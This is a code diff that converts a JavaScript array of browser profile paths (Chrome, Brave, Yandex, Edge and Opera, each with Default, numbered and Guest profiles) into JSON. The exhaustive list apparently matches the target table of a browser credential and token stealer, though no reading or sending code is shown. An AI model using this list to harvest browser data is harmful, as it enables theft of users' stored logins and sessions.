@@ -1,152 +1,152 @@
-browserPath = [
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Default\\',
-      'Default',
-      user.local + '\\Google\\Chrome\\User Data\\',
-    ],
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
-      'Profile_1',
-      user.local + '\\Google\\Chrome\\User Data\\',
-    ],
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
-      'Profile_2',
-      user.local + '\\Google\\Chrome\\User Data\\',
-    ],
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
-      'Profile_3',
-      user.local + '\\Google\\Chrome\\User Data\\',
-    ],
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
-      'Profile_4',
-      user.local + '\\Google\\Chrome\\User Data\\',
-    ],
-    [
-      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
-      'Profile_5',
-      user.local + '\\Google\\Chrome\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
-      'Default',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
-      'Profile_1',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
-      'Profile_2',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
-      'Profile_3',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
-      'Profile_4',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
-      'Profile_5',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
-      'Guest Profile',
-      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
-      'Default',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
-      'Profile_1',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
-      'Profile_2',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
-      'Profile_3',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
-      'Profile_4',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
-      'Profile_5',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
-      'Guest Profile',
-      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
-      'Default',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
-      'Profile_1',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
-      'Profile_2',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
-      'Profile_3',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
-      'Profile_4',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
-      'Profile_5',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
-      'Guest Profile',
-      user.local + '\\Microsoft\\Edge\\User Data\\',
-    ],
-    [
-      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
-      'Default',
-      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
-    ],
-    [
-      user.roaming + '\\Opera Software\\Opera Stable\\',
-      'Default',
-      user.roaming + '\\Opera Software\\Opera Stable\\',
-    ],
-    [
-      user.roaming + '\\Opera Software\\Opera GX Stable\\',
-      'Default',
-      user.roaming + '\\Opera Software\\Opera GX Stable\\',
-    ],
+[
+  [
+    "user.local\\Google\\Chrome\\User Data\\Default\\",
+    "Default",
+    "user.local\\Google\\Chrome\\User Data\\"
   ],
+  [
+    "user.local\\Google\\Chrome\\User Data\\Profile 1\\",
+    "Profile_1",
+    "user.local\\Google\\Chrome\\User Data\\"
+  ],
+  [
+    "user.local\\Google\\Chrome\\User Data\\Profile 2\\",
+    "Profile_2",
+    "user.local\\Google\\Chrome\\User Data\\"
+  ],
+  [
+    "user.local\\Google\\Chrome\\User Data\\Profile 3\\",
+    "Profile_3",
+    "user.local\\Google\\Chrome\\User Data\\"
+  ],
+  [
+    "user.local\\Google\\Chrome\\User Data\\Profile 4\\",
+    "Profile_4",
+    "user.local\\Google\\Chrome\\User Data\\"
+  ],
+  [
+    "user.local\\Google\\Chrome\\User Data\\Profile 5\\",
+    "Profile_5",
+    "user.local\\Google\\Chrome\\User Data\\"
+  ],
+  [
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
+    "Default",
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\"
+  ],
+  [
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\",
+    "Profile_1",
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\"
+  ],
+  [
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\",
+    "Profile_2",
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\"
+  ],
+  [
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\",
+    "Profile_3",
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\"
+  ],
+  [
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\",
+    "Profile_4",
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\"
+  ],
+  [
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\",
+    "Profile_5",
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\"
+  ],
+  [
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\",
+    "Guest Profile",
+    "user.local\\BraveSoftware\\Brave-Browser\\User Data\\"
+  ],
+  [
+    "user.local\\Yandex\\YandexBrowser\\User Data\\Default\\",
+    "Default",
+    "user.local\\Yandex\\YandexBrowser\\User Data\\"
+  ],
+  [
+    "user.local\\Yandex\\YandexBrowser\\User Data\\Profile 1\\",
+    "Profile_1",
+    "user.local\\Yandex\\YandexBrowser\\User Data\\"
+  ],
+  [
+    "user.local\\Yandex\\YandexBrowser\\User Data\\Profile 2\\",
+    "Profile_2",
+    "user.local\\Yandex\\YandexBrowser\\User Data\\"
+  ],
+  [
+    "user.local\\Yandex\\YandexBrowser\\User Data\\Profile 3\\",
+    "Profile_3",
+    "user.local\\Yandex\\YandexBrowser\\User Data\\"
+  ],
+  [
+    "user.local\\Yandex\\YandexBrowser\\User Data\\Profile 4\\",
+    "Profile_4",
+    "user.local\\Yandex\\YandexBrowser\\User Data\\"
+  ],
+  [
+    "user.local\\Yandex\\YandexBrowser\\User Data\\Profile 5\\",
+    "Profile_5",
+    "user.local\\Yandex\\YandexBrowser\\User Data\\"
+  ],
+  [
+    "user.local\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\",
+    "Guest Profile",
+    "user.local\\Yandex\\YandexBrowser\\User Data\\"
+  ],
+  [
+    "user.local\\Microsoft\\Edge\\User Data\\Default\\",
+    "Default",
+    "user.local\\Microsoft\\Edge\\User Data\\"
+  ],
+  [
+    "user.local\\Microsoft\\Edge\\User Data\\Profile 1\\",
+    "Profile_1",
+    "user.local\\Microsoft\\Edge\\User Data\\"
+  ],
+  [
+    "user.local\\Microsoft\\Edge\\User Data\\Profile 2\\",
+    "Profile_2",
+    "user.local\\Microsoft\\Edge\\User Data\\"
+  ],
+  [
+    "user.local\\Microsoft\\Edge\\User Data\\Profile 3\\",
+    "Profile_3",
+    "user.local\\Microsoft\\Edge\\User Data\\"
+  ],
+  [
+    "user.local\\Microsoft\\Edge\\User Data\\Profile 4\\",
+    "Profile_4",
+    "user.local\\Microsoft\\Edge\\User Data\\"
+  ],
+  [
+    "user.local\\Microsoft\\Edge\\User Data\\Profile 5\\",
+    "Profile_5",
+    "user.local\\Microsoft\\Edge\\User Data\\"
+  ],
+  [
+    "user.local\\Microsoft\\Edge\\User Data\\Guest Profile\\",
+    "Guest Profile",
+    "user.local\\Microsoft\\Edge\\User Data\\"
+  ],
+  [
+    "user.roaming\\Opera Software\\Opera Neon\\User Data\\Default\\",
+    "Default",
+    "user.roaming\\Opera Software\\Opera Neon\\User Data\\"
+  ],
+  [
+    "user.roaming\\Opera Software\\Opera Stable\\",
+    "Default",
+    "user.roaming\\Opera Software\\Opera Stable\\"
+  ],
+  [
+    "user.roaming\\Opera Software\\Opera GX Stable\\",
+    "Default",
+    "user.roaming\\Opera Software\\Opera GX Stable\\"
+  ]
+]
